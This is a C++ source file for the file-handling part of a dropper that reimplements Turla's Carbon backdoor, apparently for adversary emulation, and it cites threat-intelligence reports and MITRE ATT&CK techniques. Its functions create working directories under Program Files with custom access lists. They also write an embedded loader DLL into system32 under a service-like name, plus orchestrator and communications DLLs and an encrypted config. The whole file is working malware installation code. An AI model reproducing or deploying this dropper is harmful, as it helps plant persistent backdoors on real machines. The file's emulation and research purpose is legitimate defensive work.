/*
 * Handle file-related operations for the dropper
 *
 * CTI references:
 * [1] https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 * [2] https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 * [3] https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 */

#include <windows.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>
#include <file_handler.h>

namespace fs = std::filesystem;

namespace file_handler {

// The Carbon DLL dropper will install the Carbon components and config file [1]
const char* kConfigFileName = "setuplst.xml";
const char* kLoaderDllName = "mressvc.dll"; // Will be registered as a service [3]
const char* kOrchestratorDllName = "MSSVCCFG.dll";
const char* kCommsDllName = "msxhlp.dll";
std::string base_working_directory;
static std::string loader_dll_path_str = std::string(""); 

// Helper function to write arbitrary data to the specified output file.
int FileHandlerCallWrapper::WriteDataToFile(std::string filepath, const unsigned char* data, std::streamsize n) {
	std::ofstream outfile(filepath.c_str(), std::ofstream::binary);
	if (!outfile.is_open()) {
		return FAIL_OPEN_FILE_WRITE;
	}
	outfile.write((char*)&data[0], n);
	outfile.close();
	return ERROR_SUCCESS;
}
	
// Wrapper for getting environment variable values.
std::string FileHandlerCallWrapper::GetEnvironmentVariableWrapper(const char* env_var) {
	return std::string(std::getenv(env_var));
}

bool FileHandlerCallWrapper::DirectoryExists(fs::path dir) {
	return fs::is_directory(dir);
}

// Wrapper for ConvertStringSecurityDescriptorToSecurityDescriptor (sddl.h)
BOOL FileHandlerCallWrapper::ConvertStringSecurityDescriptorToSecurityDescriptorWrapper(
    LPCWSTR              StringSecurityDescriptor,
    DWORD                StringSDRevision,
    PSECURITY_DESCRIPTOR *SecurityDescriptor,
    PULONG               SecurityDescriptorSize
) {
    return ConvertStringSecurityDescriptorToSecurityDescriptorW(
        StringSecurityDescriptor,
        StringSDRevision,
        SecurityDescriptor,
        SecurityDescriptorSize
    );
}

// Wrapper for GetLastError (errhandlingapi.h)
DWORD FileHandlerCallWrapper::GetLastErrorWrapper() {
    return GetLastError();
}

// Wrapper for LocalFree (winbase.h)
HLOCAL FileHandlerCallWrapper::LocalFreeWrapper(HLOCAL hMem) {
    return LocalFree(hMem);
}

// Wrapper for CreateDirectory (winbase.h)
BOOL FileHandlerCallWrapper::CreateDirectoryWrapper(
	LPCWSTR               lpPathName,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes
) {
	return CreateDirectoryW(lpPathName, lpSecurityAttributes);
}

// Reference: https://learn.microsoft.com/en-us/windows/win32/secbp/creating-a-dacl
DWORD CreateDirSecurityAttr(FileHandlerCallWrapperInterface* fh_wrapper, SECURITY_ATTRIBUTES* sa) {
    sa->nLength = sizeof(SECURITY_ATTRIBUTES);
    sa->bInheritHandle = FALSE;

    std::wstring dacl_str = std::wstring(L"D:") + // Discretionary ACL
        L"(D;OICI;GA;;;BG)" +      // Deny access to built-in guests
        L"(D;OICI;GA;;;AN)" +      // Deny access to anonymous logon
        L"(A;OICI;GRGWGX;;;AU)" +  // Allow RWX to authenticated users
        L"(A;OICI;GA;;;BA)";       // Allow full control to administrators

    BOOL result = fh_wrapper->ConvertStringSecurityDescriptorToSecurityDescriptorWrapper(
        dacl_str.c_str(),
        SDDL_REVISION_1,
        &(sa->lpSecurityDescriptor),
        NULL
    );
    if (!result) {
        return fh_wrapper->GetLastErrorWrapper();
    }
    return ERROR_SUCCESS;
}

// Used to create subdirectories in Carbon working directory
DWORD CreatePermissiveDir(FileHandlerCallWrapperInterface* fh_call_wrapper, LPCWSTR dir_path) {
	SECURITY_ATTRIBUTES dir_sa;
	DWORD result = CreateDirSecurityAttr(fh_call_wrapper, &dir_sa);
	if (result != ERROR_SUCCESS) {
		return result;
	}
	if (!fh_call_wrapper->CreateDirectoryWrapper(dir_path, &dir_sa)) {
		result = fh_call_wrapper->GetLastErrorWrapper();
		fh_call_wrapper->LocalFreeWrapper(dir_sa.lpSecurityDescriptor);
		return result;
	}
	if (fh_call_wrapper->LocalFreeWrapper(dir_sa.lpSecurityDescriptor) != NULL) {
		return fh_call_wrapper->GetLastErrorWrapper();
	}
	return ERROR_SUCCESS;
}

// Carbon typically selects a random directory from %ProgramFiles% (excluding WindowsApps) to serve
// as the base working directory [1][3]. Rather than pick a random one, we'll pick one that we know
// will exist on the target machine.
int SetBaseWorkingDirectory(FileHandlerCallWrapperInterface* fh_call_wrapper) {
	std::string program_files_val = fh_call_wrapper->GetEnvironmentVariableWrapper("PROGRAMFILES");
	if (!program_files_val.empty()) {
		fs::path base_working_dir_path = fs::path(program_files_val) / fs::path(HOME_DIRECTORY_NAME);
		if (fh_call_wrapper->DirectoryExists(base_working_dir_path)) {
			base_working_directory = base_working_dir_path.string();
		} else {
			return FAIL_TARGET_BASE_DIR_DNE;
		}

		// Create subfolders for tasking and whatnot
		fs::path tasks_dir_path = base_working_dir_path / fs::path("0511");
		std::wstring tasks_dir_path_str = tasks_dir_path.wstring();
		DWORD result = CreatePermissiveDir(fh_call_wrapper, tasks_dir_path_str.c_str());
		if (result != ERROR_SUCCESS) {
			std::wcerr << "Failed to create directory " << tasks_dir_path_str << ". Error code: " << result << std::endl;
			return result;
		}

		fs::path task_output_dir_path = base_working_dir_path / fs::path("2028");
		std::wstring task_output_dir_path_str = task_output_dir_path.wstring();
		result = CreatePermissiveDir(fh_call_wrapper, task_output_dir_path_str.c_str());
		if (result != ERROR_SUCCESS) {
			std::wcerr << "Failed to create directory " << task_output_dir_path_str << ". Error code: " << result << std::endl;
			return result;
		}

		fs::path nls_dir_path = base_working_dir_path / fs::path("Nlts");
		std::wstring nls_dir_path_str = nls_dir_path.wstring();
		result = CreatePermissiveDir(fh_call_wrapper, nls_dir_path_str.c_str());
		if (result != ERROR_SUCCESS) {
			std::wcerr << "Failed to create directory " << nls_dir_path_str << ". Error code: " << result << std::endl;
			return result;
		}
	} else {
		return FAIL_ENV_DNE_PROG_FILE;
	}
	return ERROR_SUCCESS;
}

/*
 * DropComponents:
 *      About:
 *          Drop the implant components to disk: loader DLL, orchestrator DLL, communications library DLL, encrypted config file.
 *      Result:
 *          ERROR_SUCCESS on success, otherwise some other error code.
 *      MITRE ATT&CK Techniques:
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 * 			https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 */
int DropComponents(FileHandlerCallWrapperInterface* fh_call_wrapper) {
	int result = DropConfigFile(fh_call_wrapper);
	if (result != ERROR_SUCCESS) {
		return result;
	}
	result = DropLoaderDll(fh_call_wrapper);
	if (result != ERROR_SUCCESS) {
		return result;
	}
	result = DropOrchestratorDll(fh_call_wrapper);
	if (result != ERROR_SUCCESS) {
		return result;
	}
	return DropCommsDll(fh_call_wrapper);
}

/*
 * DropConfigFile:
 *      About:
 *          Write the encrypted configuration file to disk in the base working directory
 *      Result:
 *          ERROR_SUCCESS on success, otherwise some other error code.
 *      MITRE ATT&CK Techniques:
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
int DropConfigFile(FileHandlerCallWrapperInterface* fh_call_wrapper) {
	if (base_working_directory.empty()) {
		return FAIL_DROP_CONFIG_BASE_DIR_NOT_INIT;
	}
	fs::path config_file_path = fs::path(base_working_directory) / fs::path(kConfigFileName);
	if (fh_call_wrapper->WriteDataToFile(config_file_path.string(), kConfigFileData, kConfigFileDataLen) != ERROR_SUCCESS) {
		return FAIL_DROP_CONFIG_FILE_WRITE;
	}
	return ERROR_SUCCESS;
}

/*
 * DropLoaderDll:
 *      About:
 *          Write the loader DLL to disk in %SystemRoot%\system32\
 *      Result:
 *          ERROR_SUCCESS on success, otherwise some other error code.
 *      CTI:
 *          https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 */
int DropLoaderDll(FileHandlerCallWrapperInterface* fh_call_wrapper) {
	std::string systemroot_val = fh_call_wrapper->GetEnvironmentVariableWrapper("SYSTEMROOT");
	if (!systemroot_val.empty()) {
		fs::path system32_path = fs::path(systemroot_val) / "system32";
		fs::path loader_dll_path = system32_path / fs::path(kLoaderDllName);
		std::string path_str = loader_dll_path.string();
		if (fh_call_wrapper->WriteDataToFile(path_str, kLoaderDllData, kLoaderDllDataLen) != ERROR_SUCCESS) {
			return FAIL_DROP_LOADER_FILE_WRITE;
		}
		// successful write - save the path to the dropped DLL
		loader_dll_path_str = std::string(path_str);
	} else {
		return FAIL_DROP_LOADER_ENV_DNE_SYS_ROOT;
	}
	return ERROR_SUCCESS;
}

// Returns the path to the loader DLL that was written on disk. If it hasn't been written to disk yet, an empty string is returned.
std::string GetLoaderDllPath() {
	return std::string(loader_dll_path_str);
}

/*
 * DropOrchestratorDll:
 *      About:
 *          Write the orchestrator DLL to disk in the base working directory.
 *      Result:
 *          ERROR_SUCCESS on success, otherwise some other error code.
 *      CTI:
 *          https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 */
int DropOrchestratorDll(FileHandlerCallWrapperInterface* fh_call_wrapper) {
	if (base_working_directory.empty()) {
		return FAIL_DROP_ORCH_BASE_DIR_NOT_INIT;
	}
	fs::path orchestrator_dll_path = fs::path(base_working_directory) / fs::path(kOrchestratorDllName);
	if (fh_call_wrapper->WriteDataToFile(orchestrator_dll_path.string(), kOrchestratorDllData, kOrchestratorDllDataLen) != ERROR_SUCCESS) {
		return FAIL_DROP_ORCH_FILE_WRITE;
	}
	return ERROR_SUCCESS;
}

/*
 * DropCommsDll:
 *      About:
 *          Write the communications library DLL to disk in the base working directory
 *      Result:
 *          ERROR_SUCCESS on success, otherwise some other error code.
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
int DropCommsDll(FileHandlerCallWrapperInterface* fh_call_wrapper) {
	if (base_working_directory.empty()) {
		return FAIL_DROP_COMMS_BASE_DIR_NOT_INIT;
	}
	fs::path commsDllPath = fs::path(base_working_directory) / fs::path(kCommsDllName);
	if (fh_call_wrapper->WriteDataToFile(commsDllPath.string(), kCommsDllData, kCommsDllDataLen) != ERROR_SUCCESS) {
		return FAIL_DROP_COMMS_FILE_WRITE;
	}
	return ERROR_SUCCESS;
}

} // namespace file_handler

